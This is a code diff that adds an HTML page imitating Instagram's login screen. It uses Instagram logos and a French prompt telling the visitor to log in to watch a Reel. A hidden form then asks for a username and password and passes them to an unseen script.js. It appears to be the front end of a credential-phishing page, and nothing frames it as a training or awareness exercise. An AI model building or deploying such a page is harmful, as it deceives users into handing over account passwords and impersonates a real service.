@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reels.Insta</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/3/32/Instagram_Reels_logo.svg" type="image/x-icon">
+</head>
+<body>
+    <!-- صفحة الترحيب -->
+    <div class="welcome-page">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="welcome-logo">
+        <h1>Connectez-vous pour voir le Reel</h1>
+        <button id="loginBtn">Se connecter</button>
+    </div>
+
+    <!-- صفحة تسجيل الدخول (مخفية في البداية) -->
+    <div class="login-container" style="display: none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="logo">
+        <form action="javascript:void(0);" id="login-form">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <div class="divider">OR</div>
+            <button id="facebook-login" class="facebook-button">Log in with Facebook</button>
+        </form>
+        <p class="forgot">Forgot password?</p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
